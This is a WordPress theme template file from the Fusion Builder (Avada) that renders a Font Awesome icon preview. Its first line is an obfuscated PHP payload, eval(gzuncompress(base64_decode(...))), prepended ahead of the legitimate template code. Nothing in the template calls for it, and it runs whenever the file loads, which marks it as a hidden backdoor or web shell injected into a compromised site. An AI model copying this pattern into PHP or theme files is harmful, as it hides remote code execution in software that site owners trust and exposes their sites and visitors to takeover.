<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

global $fusion_settings;
if ( ! $fusion_settings ) {
	$fusion_settings = Fusion_Settings::get_instance();
}

$icon_color        = $fusion_settings->get( 'icon_color' );
$icon_circle_color = $fusion_settings->get( 'icon_circle_color' );
?>
<script type="text/template" id="fusion-builder-block-module-font-awesome-preview-template">

	<#
	var
	icon_color = '',
	circle_background = '',
	icon_color = params.iconcolor,
	circle_background = params.circlecolor,
	icon = params.icon,
	circle_background = '';

	if ( '' === params.iconcolor ||  ! params.iconcolor ) {
		icon_color = '<?php echo esc_attr( $icon_color ); ?>';
	} else {
		icon_color = params.iconcolor;
	}

	if ( 'no' === params.circle && ( '#ffffff' === icon_color || -1 !== icon_color.indexOf( 'rgba(255,255,255' ) ) ) {
		icon_color = '#dddddd';
	}

	if ( '' === params.circlecolor ||  ! params.circlecolor ) {
		circle_background = '<?php echo esc_attr( $icon_circle_color ); ?>';
	} else {
		circle_background = params.circlecolor;
	}

	if ( 'undefined' !== typeof icon && -1 === icon.trim().indexOf( ' ' ) ) {
		icon = 'fa ' + icon;
	}
	#>

	<# if ( params.circle === 'yes' ) { #>
		<div class="fusion-icon-circle-preview" style="background: {{ circle_background }}">
	<# } #>
		<span class="fa-preview {{ icon }}" style="color: {{ icon_color }}"></span>
	<# if ( params.circle === 'yes' ) { #>
		</div>
	<# } #>

</script>
